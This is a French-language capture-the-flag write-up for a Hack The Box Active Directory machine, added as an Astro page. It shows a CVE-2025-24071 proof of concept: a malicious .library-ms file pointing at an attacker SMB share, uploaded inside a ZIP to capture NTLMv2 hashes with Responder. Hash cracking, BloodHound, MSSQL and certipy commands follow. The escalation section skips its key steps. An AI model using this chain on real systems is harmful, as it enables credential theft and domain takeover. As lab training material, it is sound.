@@ -1,0 +1,147 @@
+---
+import Layout from '../../layouts/Layout.astro'
+---
+<Layout title="HTB - NanoCorp">
+
+  <div style="margin-bottom:2rem;">
+    <a href="/writeups" style="color:#475569; font-size:0.82rem;">← writeups</a>
+    <h1 style="font-size:1.8rem; font-weight:700; color:#e2e8f0; margin:0.75rem 0 0.5rem;">HTB - NanoCorp</h1>
+    <div style="display:flex; flex-wrap:wrap; gap:0.5rem; align-items:center; margin-bottom:0.75rem;">
+      <span class="badge-hard">Hard</span>
+      <span style="color:#64748b;">·</span>
+      <span style="color:#94a3b8; font-size:0.82rem;">Windows Server 2022 — Active Directory</span>
+      <span style="color:#64748b;">·</span>
+      <span style="color:#475569; font-size:0.8rem;">08 Nov 2025</span>
+    </div>
+    <div style="display:flex; flex-wrap:wrap; gap:0.35rem; margin-top:0.5rem;">
+      <span style="background:rgba(239,68,68,0.1); color:#f87171; border:1px solid rgba(239,68,68,0.25); padding:2px 8px; border-radius:4px; font-size:0.7rem; font-weight:700;">CVE-2025-24071</span>
+    </div>
+  </div>
+
+  <div style="background:var(--bg-800); border-left:3px solid #c0392b; border-top:1px solid var(--border); border-right:1px solid var(--border); border-bottom:1px solid var(--border); border-radius:0 8px 8px 0; padding:1rem 1.25rem; margin-bottom:2rem;">
+    <div style="color:#64748b; font-size:0.7rem; text-transform:uppercase; letter-spacing:0.05em; margin-bottom:0.4rem;">Résumé</div>
+    <p style="color:#94a3b8; font-size:0.88rem; line-height:1.7; margin:0;">Box Hard Windows AD — CVE-2025-24071 exploite le parsing automatique des fichiers .library-ms dans un ZIP pour capturer un hash NTLMv2 sans interaction utilisateur via Responder, puis enchaîne MSSQL et ADCS pour compromettre le domaine.</p>
+  </div>
+
+  <div style="margin-bottom:2.5rem;">
+    <div style="color:#334155; font-size:0.78rem; margin-bottom:0.75rem;">$ cat attack_chain.txt</div>
+    <div style="border:1px solid var(--border); border-radius:8px; overflow:hidden;">
+      <div style="background:#050508; padding:0.4rem 1rem; border-bottom:1px solid var(--border); color:#475569; font-size:0.7rem; text-transform:uppercase;">Chaîne d'exploitation</div>
+      {[
+        { n:'1', v:'Upload ZIP + CVE-2025-24071 (.library-ms)', r:'Hash NTLMv2 web_svc capturé par Responder' },
+        { n:'2', v:'Hashcat -m 5600 NTLMv2', r:'Credentials web_svc' },
+        { n:'3', v:'MSSQL + ADCS', r:'Shell utilisateur' },
+        { n:'4', v:'Escalade AD', r:'Domain Admin → root flag' },
+      ].map((s,i,a) => (
+        <div style={"display:flex; gap:0.75rem; padding:0.7rem 1rem; background:var(--bg-800);" + (i<a.length-1?"border-bottom:1px solid #0d0d15;":"")}>
+          <div style="width:22px; height:22px; border-radius:50%; display:flex; align-items:center; justify-content:center; font-size:0.7rem; font-weight:700; flex-shrink:0; background:#c0392b22; color:#f87171; border:1px solid #c0392b44;">{s.n}</div>
+          <div><div style="color:#e2e8f0; font-size:0.82rem; font-weight:600;">{s.v}</div><div style="color:#475569; font-size:0.75rem; margin-top:0.1rem;">→ {s.r}</div></div>
+        </div>
+      ))}
+    </div>
+  </div>
+
+  <div class="prose">
+
+    <h2>1 — Reconnaissance</h2>
+    <pre is:raw>sudo ntpdate -u 10.129.22.123    # Clock skew +6h59m — OBLIGATOIRE
+echo "10.129.22.123 nanocorp.htb dc01.nanocorp.htb hire.nanocorp.htb" | sudo tee -a /etc/hosts
+
+nmap -sC -sV -Pn 10.129.22.123
+
+PORT    STATE SERVICE  VERSION
+80/tcp  open  http     Apache 2.4.58 (PHP 8.2.12) → nanocorp.htb
+88/tcp  open  kerberos → DC confirmé
+389/tcp open  ldap     → nanocorp.htb, DC01
+445/tcp open  SMB      signing: required → relay bloqué
+5986/tcp open WinRM-SSL
+3389/tcp open RDP
+# clock-skew: +6h59m58s</pre>
+    <pre is:raw># Sous-domaine hire.nanocorp.htb avec formulaire d'upload ZIP
+gobuster dir -u http://hire.nanocorp.htb \
+  -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html -t 50
+# upload.php [200] → traite les ZIPs côté serveur Windows
+# /uploads   [403] → dossier d'extraction</pre>
+
+    <h2>2 — CVE-2025-24071 : NTLM Hash Leak via ZIP</h2>
+    <p>Windows Explorer parse automatiquement les fichiers .library-ms lors de l'extraction d'un ZIP. Ces fichiers XML peuvent contenir un chemin UNC pointant vers notre machine. Windows tente alors une authentification SMB automatique, envoyant le hash NTLMv2 <strong>sans interaction utilisateur</strong>.</p>
+    <pre is:raw># Étape 1 — Lancement de Responder
+sudo responder -I tun0
+
+# Étape 2 — Création du fichier .library-ms malveillant
+cat > evil.library-ms &lt;&lt; 'EOF'
+&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library"&gt;
+  &lt;searchConnectorDescriptionList&gt;
+    &lt;searchConnectorDescription&gt;
+      &lt;simpleLocation&gt;
+        &lt;url&gt;\\10.10.14.51\share&lt;/url&gt;
+      &lt;/simpleLocation&gt;
+    &lt;/searchConnectorDescription&gt;
+  &lt;/searchConnectorDescriptionList&gt;
+&lt;/libraryDescription&gt;
+EOF
+
+zip cv_resume.zip evil.library-ms
+
+# Étape 3 — Upload et capture
+curl -s -X POST http://hire.nanocorp.htb/upload.php \
+  -F "fullname=John Doe" \
+  -F "email=john@test.com" \
+  -F "position=Software Engineer" \
+  -F "resume=@cv_resume.zip;type=application/zip"
+
+# Responder capture :
+# [SMB] NTLMv2-SSP Client   : 10.129.22.123
+# [SMB] NTLMv2-SSP Username : NANOCORP\web_svc
+# [SMB] NTLMv2-SSP Hash     : web_svc::NANOCORP:[HASH_NTLMV2_REDACTED]</pre>
+    <pre is:raw>hashcat -m 5600 web_svc.hash /usr/share/wordlists/rockyou.txt --force
+# Status: Cracked → web_svc:[MOT_DE_PASSE_REDACTED]
+
+netexec smb nanocorp.htb -u web_svc -p '[REDACTED]'
+# [+] nanocorp.htb\web_svc:[REDACTED]</pre>
+    <div style="border-left:3px solid #facc15; background:rgba(250,204,21,0.05); padding:0.65rem 1rem; margin:0.75rem 0; border-radius:0 6px 6px 0; font-size:0.82rem; color:#fde68a;">💡 SMB signing requis → relay SMB→SMB bloqué. Mais la CAPTURE de hash via Responder fonctionne toujours — le signing n'empêche que le relay, pas l'authentification initiale.</div>
+
+    <h2>3 — Post-exploitation MSSQL & Escalade AD</h2>
+    <p>Avec les credentials web_svc, utiliser BloodHound pour cartographier les chemins d'escalade. La machine comporte un serveur MSSQL et un template ADCS exploitable.</p>
+    <pre is:raw>bloodhound-python -u web_svc -p '[REDACTED]' -d nanocorp.htb \
+  -ns 10.129.22.123 -c all
+
+impacket-mssqlclient nanocorp.htb/web_svc:'[REDACTED]'@10.129.22.123 -windows-auth
+
+# Énumération ADCS si template vulnérable
+certipy find -u web_svc -p '[REDACTED]' -dc-ip 10.129.22.123
+
+cat C:\Users\Administrator\Desktop\root.txt</pre>
+
+  </div>
+
+  <div style="margin-bottom:2.5rem;">
+    <h2 style="color:var(--cyber); font-size:1.05rem; font-weight:700; border-bottom:1px solid rgba(0,255,157,0.2); padding-bottom:0.4rem; margin-bottom:1rem;">Leçons apprises</h2>
+    <div style="display:flex; flex-direction:column; gap:0.5rem;">
+      {[
+        'CVE-2025-24071 : les fichiers .library-ms dans un ZIP déclenchent une auth NTLM automatique sous Windows',
+        'SMB signing requis n\'empêche pas la capture de hash NTLMv2 via Responder',
+        'Clock skew +7h : synchroniser NTP avant toute opération Kerberos',
+        'BloodHound est indispensable pour visualiser les chemins d\'escalade en AD',
+      ].map(l => (
+        <div style="display:flex; gap:0.6rem; color:#94a3b8; font-size:0.85rem;"><span style="color:var(--cyber); flex-shrink:0;">→</span>{l}</div>
+      ))}
+    </div>
+  </div>
+
+  <div>
+    <h2 style="color:var(--cyber); font-size:1.05rem; font-weight:700; border-bottom:1px solid rgba(0,255,157,0.2); padding-bottom:0.4rem; margin-bottom:1rem;">Outils utilisés</h2>
+    <div style="display:flex; flex-wrap:wrap; gap:0.4rem;">
+      {['nmap','responder','hashcat','netexec','bloodhound-python','impacket','certipy'].map(t => (
+        <span style="background:#050508; border:1px solid #1a1a2e; padding:3px 10px; border-radius:6px; font-size:0.75rem; color:#64748b; font-family:monospace;">{t}</span>
+      ))}
+    </div>
+  </div>
+
+  <div style="margin-top:3rem; padding-top:1.5rem; border-top:1px solid var(--border); display:flex; justify-content:space-between;">
+    <a href="/writeups" style="color:#475569; font-size:0.85rem;">← Tous les writeups</a>
+    <a href="/about" style="color:var(--cyber); font-size:0.85rem;">About →</a>
+  </div>
+
+</Layout>
